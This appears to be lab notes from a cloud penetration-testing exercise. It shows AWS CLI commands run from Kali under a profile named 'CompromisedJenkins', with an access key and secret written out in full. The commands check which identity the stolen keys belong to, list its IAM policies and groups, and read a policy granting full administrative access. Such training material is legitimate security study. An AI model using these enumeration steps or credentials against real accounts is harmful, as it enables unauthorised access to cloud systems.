# Discovering What We Have Access To

Configuring a new profile
>``` shell
>kali@kali:~$ aws configure --profile=CompromisedJenkins  
>
># ========== Expected Result ==========
>AWS Access Key ID [None]: AKIAUBHUBEGIMU2Y5GY7
>AWS Secret Access Key [None]: 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
>Default region name [None]: us-east-1
>Default output format [None]: 
># =====================================
>```

Getting User Name
>``` shell
>kali@kali:~$ aws --profile CompromisedJenkins sts get-caller-identity
>
># ========== Expected Result ==========
>{
>    "UserId": "AIDAUBHUBEGILTF7TFWME",
>    "Account": "274737132808",
>    "Arn": "arn:aws:iam::274737132808:user/system/jenkins-admin",
>}
># =====================================
>```

Listing Policies and Group for User
>``` shell
>kali@kali:~$ aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin
>
># ========== Expected Result ==========
>{
>    "PolicyNames": [
>        "jenkins-admin-role"
>    ]
>}
># =====================================
>
>kali@kali:~$ aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
>
># ========== Expected Result ==========
>{
>    "AttachedPolicies": []
>}
># =====================================
>
>kali@kali:~$ aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin
>
># ========== Expected Result ==========
>{
>    "Groups": []
>}
># =====================================
>```

Getting Policy
>``` shell
>kali@kali:~$ aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
>
># ========== Expected Result ==========
>{
>    "UserName": "jenkins-admin",
>    "PolicyName": "jenkins-admin-role",
>    "PolicyDocument": {
>        "Version": "2012-10-17",
>        "Statement": [
>            {
>                "Sid": "",
>                "Effect": "Allow",
>                "Action": "*",
>                "Resource": "*"
>            }
>        ]
>    }
>}
># =====================================
>```
